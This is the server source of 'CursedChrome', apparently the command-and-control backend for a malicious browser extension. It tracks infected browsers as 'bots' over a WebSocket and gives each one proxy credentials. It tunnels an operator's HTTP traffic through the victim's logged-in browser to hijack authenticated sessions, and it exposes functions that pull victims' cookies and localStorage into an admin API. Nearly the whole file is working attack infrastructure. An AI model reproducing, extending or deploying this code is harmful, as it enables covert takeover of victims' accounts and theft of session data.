'use strict';

const AnyProxy = require('./anyproxy');
const { WebSocketServer, WebSocket } = require('ws');
const { v4: uuidv4 } = require('uuid');

const { database_init, Bots } = require('./database');
const { get_secure_random_string, logit } = require('./utils');
const { get_api_server } = require('./api-server');

const PROXY_PORT = parseInt(process.env.PROXY_PORT || '8080');
const WS_PORT   = parseInt(process.env.WS_PORT || '4343');
const API_PORT  = parseInt(process.env.API_SERVER_PORT || '8118');

// browser_id → open WebSocket
const browser_connections = new Map();

// request_id → { resolve, reject } for in-flight RPC calls
const pending_requests = new Map();

function rpc(ws, action, data = {}) {
    return new Promise((resolve, reject) => {
        const id = uuidv4();
        const timer = setTimeout(() => {
            pending_requests.delete(id);
            reject(new Error(`RPC timeout: ${action}`));
        }, 30_000);

        pending_requests.set(id, {
            resolve(result) { clearTimeout(timer); resolve(result); },
            reject(err)     { clearTimeout(timer); reject(err); },
        });

        ws.send(JSON.stringify({ id, version: '1.0.0', action, data }));
    });
}

async function handle_new_connection(ws) {
    logit('New browser connected — authenticating...');
    let auth;
    try {
        auth = await rpc(ws, 'AUTH');
    } catch {
        logit('Auth timed out, closing connection.');
        ws.close();
        return;
    }

    const { browser_id, user_agent } = auth;
    ws.browser_id = browser_id;
    browser_connections.set(browser_id, ws);

    const bot = await Bots.findOne({ where: { browser_id } });
    if (!bot) {
        logit(`New browser ${browser_id} — creating credentials...`);
        await Bots.create({
            id: uuidv4(),
            name: 'Untitled Bot',
            browser_id,
            proxy_username: `botuser${get_secure_random_string(8)}`,
            proxy_password: get_secure_random_string(18),
            is_online: true,
            user_agent,
        });
    } else {
        await bot.update({ is_online: true, user_agent });
        logit(`Bot "${bot.name}" reconnected.`);
    }
}

async function send_request_via_browser(browser_id, request_data) {
    const ws = browser_connections.get(browser_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        throw new Error(`Browser ${browser_id} is not connected`);
    }
    return rpc(ws, 'HTTP_REQUEST', request_data);
}

async function get_browser_cookies(browser_id) {
    const ws = browser_connections.get(browser_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        throw new Error(`Browser ${browser_id} is not connected`);
    }
    return rpc(ws, 'GET_COOKIES');
}

async function get_browser_localstorage(browser_id, origin) {
    const ws = browser_connections.get(browser_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        throw new Error(`Browser ${browser_id} is not connected`);
    }
    return rpc(ws, 'GET_LOCAL_STORAGE', { origin });
}

const AUTH_REQUIRED = {
    response: {
        statusCode: 407,
        header: { 'Proxy-Authenticate': 'Basic realm="CursedChrome"' },
        body: 'Proxy authentication required.',
    },
};

const proxy_rule = {
    async beforeSendRequest(detail) {
        const headers = detail.requestOptions.headers;
        const auth_header = Object.entries(headers)
            .find(([k]) => k.toLowerCase() === 'proxy-authorization')?.[1];

        if (!auth_header?.startsWith('Basic ')) return AUTH_REQUIRED;

        const decoded = Buffer.from(auth_header.slice(6).trim(), 'base64').toString();
        const colon   = decoded.indexOf(':');
        if (colon === -1) return AUTH_REQUIRED;

        const username = decoded.slice(0, colon);
        const password = decoded.slice(colon + 1);

        const bot = await Bots.findOne({ where: { proxy_username: username, proxy_password: password } });
        if (!bot) {
            logit(`Proxy auth failed for '${username}'`);
            return AUTH_REQUIRED;
        }

        const body = detail.requestData?.length
            ? detail.requestData.toString('base64')
            : null;

        logit(`[${bot.name}] ${detail.requestOptions.method} ${detail.url}`);

        let response;
        try {
            response = await send_request_via_browser(bot.browser_id, {
                url: detail.url,
                method: detail.requestOptions.method,
                headers,
                body,
                authenticated: true,
            });
        } catch (e) {
            logit(`[${bot.name}] Error: ${e.message}`);
            return {
                response: {
                    statusCode: 503,
                    header: { 'Content-Type': 'text/plain' },
                    body: Buffer.from('CursedChrome: browser proxy error.'),
                },
            };
        }

        logit(`[${bot.name}] ${response.status} ${detail.url}`);

        const response_headers = { ...response.headers };
        delete response_headers['content-encoding'];

        // Resolve relative Location headers against the original request URL so the
        // client browser doesn't resolve them against the wrong domain (e.g. turning
        // /mail/ into https://login.microsoftonline.com/mail/ during OAuth flows).
        if (response.status >= 300 && response.status < 400) {
            const loc = response_headers['location'] || response_headers['Location'];
            if (loc && !loc.startsWith('http://') && !loc.startsWith('https://')) {
                try {
                    const resolved = new URL(loc, detail.url).href;
                    response_headers['location'] = resolved;
                    delete response_headers['Location'];
                } catch {}
            }
        }

        return {
            response: {
                statusCode: response.status,
                header: response_headers,
                body: Buffer.from(response.body, 'base64'),
            },
        };
    },
};

async function main() {
    logit('Initializing database...');
    await database_init();

    // WebSocket server
    const wss = new WebSocketServer({ port: WS_PORT });

    wss.on('connection', async (ws) => {
        ws.on('close', async () => {
            if (!ws.browser_id) return;
            logit(`Browser ${ws.browser_id} disconnected.`);
            browser_connections.delete(ws.browser_id);
            const bot = await Bots.findOne({ where: { browser_id: ws.browser_id } });
            if (bot) await bot.update({ is_online: false });
        });

        ws.on('message', (raw) => {
            let msg;
            try { msg = JSON.parse(raw); } catch { return; }

            if (msg.action === 'PING') {
                ws.send(JSON.stringify({ id: uuidv4(), version: '1.0.0', action: 'PONG', data: {} }));
                return;
            }

            const pending = pending_requests.get(msg.id);
            if (pending) {
                pending_requests.delete(msg.id);
                pending.resolve(msg.result);
            }
        });

        handle_new_connection(ws).catch((e) => {
            logit(`Connection error: ${e.message}`);
            ws.close();
        });
    });

    logit(`WebSocket server listening on port ${WS_PORT}`);

    // HTTP proxy
    const proxy = new AnyProxy.ProxyServer({
        port: PROXY_PORT,
        rule: proxy_rule,
        webInterface: { enable: false },
        forceProxyHttps: true,
        wsIntercept: false,
        silent: true,
    });
    proxy.on('ready', () => logit(`Proxy server listening on port ${PROXY_PORT}`));
    proxy.on('error', (e) => logit(`Proxy error: ${e.message}`));
    proxy.start();

    // API + admin panel
    const api = await get_api_server({ get_browser_cookies, get_browser_localstorage });
    api.listen(API_PORT, () => logit(`API server listening on port ${API_PORT}`));
}

main().catch((e) => {
    console.error('Fatal:', e);
    process.exit(1);
});
